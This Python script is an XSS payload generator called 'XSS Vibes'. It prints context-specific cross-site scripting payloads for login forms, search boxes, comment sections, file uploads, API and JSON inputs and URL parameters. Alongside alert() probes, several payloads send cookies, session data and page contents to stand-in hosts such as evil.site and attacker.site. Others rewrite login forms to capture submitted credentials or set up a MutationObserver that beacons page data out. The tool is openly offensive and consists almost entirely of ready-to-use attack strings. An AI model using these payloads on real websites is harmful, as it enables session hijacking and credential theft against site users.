#!/usr/bin/env python3
"""
XSS Vibes - Contextual Payload Generator
Advanced context-aware XSS payload generation for specific scenarios
"""

import json
import random
import argparse
import sys
from pathlib import Path


class ContextualXSSGenerator:
    def __init__(self):
        self.data_dir = Path(__file__).parent.parent / "xss_vibes" / "data"
        self.categories_dir = self.data_dir / "categories"
        self.payloads = self.load_all_payloads()

    def load_all_payloads(self):
        """Load all payloads from category files"""
        payloads = {}

        for category_file in self.categories_dir.glob("*.json"):
            try:
                with open(category_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    category = data.get("category", category_file.stem)
                    payloads[category] = data.get("payloads", [])
            except Exception as e:
                print(f"⚠️ Warning: Could not load {category_file}: {e}")

        return payloads

    def generate_login_form_payloads(self, target_field="username"):
        """Generate XSS payloads specifically for login forms"""

        print(f"🔥 XSS Vibes - Login Form Context Generator")
        print(f"===========================================")
        print(f"🎯 Target Field: {target_field}")
        print(f"📋 Context: Login Form Exploitation")
        print()

        # Login form specific contexts and payloads
        login_contexts = {
            "username_field": [
                "admin'><script>alert('XSS in username')</script>",
                "admin\"><img src=x onerror=alert('Username XSS')>",
                "admin'><svg onload=alert('SVG XSS')>",
                "admin\\u003cscript\\u003ealert('Unicode XSS')\\u003c/script\\u003e",
                "admin'><iframe src=javascript:alert('Iframe XSS')>",
                "\"><script>fetch('/admin/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))</script>",
                "'><img src=x onerror=\"fetch('/api/user/'+document.cookie).then(r=>alert(r.status))\">",
            ],
            "password_field": [
                "pass'><script>alert(document.cookie)</script>",
                "pass\"><img src=x onerror=alert('Password field XSS')>",
                "pass'><svg onload=location='http://evil.site?cookie='+document.cookie>",
                "pass\\\"><script>new Image().src='//evil.site/steal?data='+btoa(document.body.innerHTML)</script>",
                "pass'><iframe src=\"javascript:alert('Password context')\">",
            ],
            "remember_me": [
                "1'><script>alert('Checkbox XSS')</script>",
                "true\"><img src=x onerror=alert('Remember me XSS')>",
                "on'><svg onload=alert('Boolean context')>",
            ],
            "csrf_token": [
                "token123'><script>alert('CSRF token XSS')</script>",
                "abc123\"><img src=x onerror=fetch('/admin').then(r=>alert(r.status))>",
                "csrf'><svg onload=alert('Token field compromised')>",
            ],
        }

        # Advanced payloads for login forms
        advanced_payloads = {
            "session_hijack": [
                "'><script>fetch('//evil.site/steal',{method:'POST',body:document.cookie})</script>",
                '"><img src=x onerror="new Image().src=\'//attacker.site/log?session=\'+document.cookie">',
                "'><svg onload=\"fetch('/api/sessions').then(r=>r.json()).then(d=>fetch('//evil.site',{method:'POST',body:JSON.stringify(d)}))\">",
            ],
            "admin_panel_redirect": [
                "'><script>if(document.cookie.includes('admin')){location='//evil.site/admin?'+document.cookie}</script>",
                "\"><img src=x onerror=\"if(localStorage.role=='admin')location='//attacker.site/panel'\">",
            ],
            "form_hijack": [
                "'><script>document.forms[0].action='//evil.site/capture';</script>",
                "\"><img src=x onerror=\"document.querySelector('form').addEventListener('submit',e=>{fetch('//evil.site/login',{method:'POST',body:new FormData(e.target)})})\">",
            ],
            "mutation_observer": [
                "'><script>new MutationObserver(m=>m.forEach(r=>r.addedNodes.forEach(n=>n.textContent&&fetch('//evil.site/mutation?data='+btoa(n.textContent))))).observe(document,{childList:true,subtree:true})</script>",
            ],
        }

        # Context-specific recommendations
        context = target_field.lower()
        if context in login_contexts:
            print(f"🎯 Basic {target_field.title()} Field Payloads:")
            print(f"{'='*50}")
            for i, payload in enumerate(login_contexts[context], 1):
                print(f"{i:2d}. {payload}")
            print()

        print(f"🔥 Advanced Login Form Exploits:")
        print(f"{'='*40}")
        for category, payloads in advanced_payloads.items():
            print(f"\n🎯 {category.replace('_', ' ').title()}:")
            for i, payload in enumerate(payloads, 1):
                print(f"   {i}. {payload}")

        # GOD TIER payloads from our new categories
        print(f"\n🏆 GOD TIER Login Form Payloads:")
        print(f"{'='*40}")

        god_tier_categories = [
            "mutation_xss",
            "jsfuck_unicode",
            "advanced_polyglot",
            "async_modern_js",
        ]
        for category in god_tier_categories:
            if category in self.payloads:
                print(f"\n🔥 {category.replace('_', ' ').title()}:")
                for payload_data in self.payloads[category][:2]:  # Top 2 from each
                    print(f"   • {payload_data['payload']}")
                    print(f"     └─ {payload_data['description']}")

        print(f"\n💡 Login Form Testing Strategy:")
        print(f"{'='*40}")
        print(f"1. 🎯 Test each input field separately")
        print(f"2. 🔍 Check for reflection in error messages")
        print(f"3. 🕵️  Monitor network requests after submission")
        print(f"4. 🔄 Test different HTTP methods (POST/GET)")
        print(f"5. 🛡️  Verify WAF behavior with encoding")
        print(f"6. 📱 Test mobile/responsive versions")
        print(f"7. 🔗 Check for AJAX form processing")
        print(f"8. 🍪 Monitor cookie/session changes")

        return login_contexts.get(context, [])

    def generate_context_payloads(self, context_type):
        """Generate payloads for specific contexts"""

        context_mapping = {
            "login_form": self.generate_login_form_payloads,
            "search_form": self.generate_search_form_payloads,
            "comment_section": self.generate_comment_payloads,
            "file_upload": self.generate_upload_payloads,
            "api_endpoint": self.generate_api_payloads,
            "json_input": self.generate_json_payloads,
            "url_parameter": self.generate_url_param_payloads,
        }

        if context_type in context_mapping:
            return context_mapping[context_type]()
        else:
            print(f"❌ Unknown context: {context_type}")
            print(f"💡 Available contexts: {', '.join(context_mapping.keys())}")
            return []

    def generate_search_form_payloads(self):
        """Generate search-specific XSS payloads"""
        print(f"🔍 Search Form XSS Payloads:")
        print(f"{'='*30}")

        search_payloads = [
            "<script>alert('Search XSS')</script>",
            "\"><img src=x onerror=alert('Search reflection')>",
            "search'><svg onload=alert('SVG in search')>",
            "term'><iframe src=javascript:alert('Search iframe')>",
            "query\"><script>fetch('//evil.site/search?q='+encodeURIComponent(document.body.innerHTML))</script>",
            "\\u003cscript\\u003ealert('Unicode search')\\u003c/script\\u003e",
        ]

        for i, payload in enumerate(search_payloads, 1):
            print(f"{i:2d}. {payload}")

        return search_payloads

    def generate_comment_payloads(self):
        """Generate comment section XSS payloads"""
        print(f"💬 Comment Section XSS Payloads:")
        print(f"{'='*35}")

        comment_payloads = [
            "Great post! <script>alert('Comment XSS')</script>",
            "Nice article! \"><img src=x onerror=alert('Stored XSS')>",
            "Love it! '<svg onload=alert('Comment stored')>",
            "Thanks! '<iframe src=javascript:alert('Comment iframe')>",
            "Awesome! \"><script>setInterval(()=>fetch('//evil.site/beacon?'+document.cookie),5000)</script>",
        ]

        for i, payload in enumerate(comment_payloads, 1):
            print(f"{i:2d}. {payload}")

        return comment_payloads

    def generate_upload_payloads(self):
        """Generate file upload XSS payloads"""
        print(f"📁 File Upload XSS Payloads:")
        print(f"{'='*30}")

        upload_payloads = [
            "filename.jpg'><script>alert('Upload XSS')</script>",
            "file.png\"><img src=x onerror=alert('Filename XSS')>",
            "doc.pdf'><svg onload=alert('File upload')>",
            "image.gif\"><iframe src=javascript:alert('Upload iframe')>",
        ]

        for i, payload in enumerate(upload_payloads, 1):
            print(f"{i:2d}. {payload}")

        return upload_payloads

    def generate_api_payloads(self):
        """Generate API endpoint XSS payloads"""
        print(f"🔌 API Endpoint XSS Payloads:")
        print(f"{'='*30}")

        api_payloads = [
            '{"name":"<script>alert(\'API XSS\')</script>"}',
            '{"search":""><img src=x onerror=alert(\'API reflection\')>"}',
            '{"query":"\'><svg onload=alert(\'JSON XSS\')>"}',
            '{"data":""><iframe src=javascript:alert(\'API iframe\')>"}',
        ]

        for i, payload in enumerate(api_payloads, 1):
            print(f"{i:2d}. {payload}")

        return api_payloads

    def generate_json_payloads(self):
        """Generate JSON input XSS payloads"""
        print(f"📋 JSON Input XSS Payloads:")
        print(f"{'='*28}")

        json_payloads = [
            '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
            '{"constructor":{"constructor":"alert(1)"}}',
            '{"data":"<script>alert(\\"JSON XSS\\")</script>"}',
        ]

        for i, payload in enumerate(json_payloads, 1):
            print(f"{i:2d}. {payload}")

        return json_payloads

    def generate_url_param_payloads(self):
        """Generate URL parameter XSS payloads"""
        print(f"🔗 URL Parameter XSS Payloads:")
        print(f"{'='*32}")

        url_payloads = [
            "?search=<script>alert('URL XSS')</script>",
            "?q=\"><img src=x onerror=alert('URL reflection')>",
            "?name='><svg onload=alert('URL param')>",
            "?data=\"><iframe src=javascript:alert('URL iframe')>",
        ]

        for i, payload in enumerate(url_payloads, 1):
            print(f"{i:2d}. {payload}")

        return url_payloads


def main():
    parser = argparse.ArgumentParser(
        description="XSS Vibes Contextual Payload Generator"
    )
    parser.add_argument(
        "--context",
        "-c",
        choices=[
            "login_form",
            "search_form",
            "comment_section",
            "file_upload",
            "api_endpoint",
            "json_input",
            "url_parameter",
        ],
        default="login_form",
        help="Target context for payload generation",
    )
    parser.add_argument(
        "--field",
        "-f",
        default="username",
        help="Specific field to target (for login_form context)",
    )
    parser.add_argument(
        "--list-contexts", "-l", action="store_true", help="List all available contexts"
    )

    args = parser.parse_args()

    generator = ContextualXSSGenerator()

    if args.list_contexts:
        print("🎯 Available XSS Contexts:")
        print("=" * 30)
        contexts = [
            "login_form",
            "search_form",
            "comment_section",
            "file_upload",
            "api_endpoint",
            "json_input",
            "url_parameter",
        ]
        for context in contexts:
            print(f"  • {context}")
        return

    if args.context == "login_form":
        generator.generate_login_form_payloads(args.field)
    else:
        generator.generate_context_payloads(args.context)

    print(f"\n🔥 XSS Vibes - Context generation complete!")
    print(f"⚠️  Remember: Only test on authorized targets!")


if __name__ == "__main__":
    main()
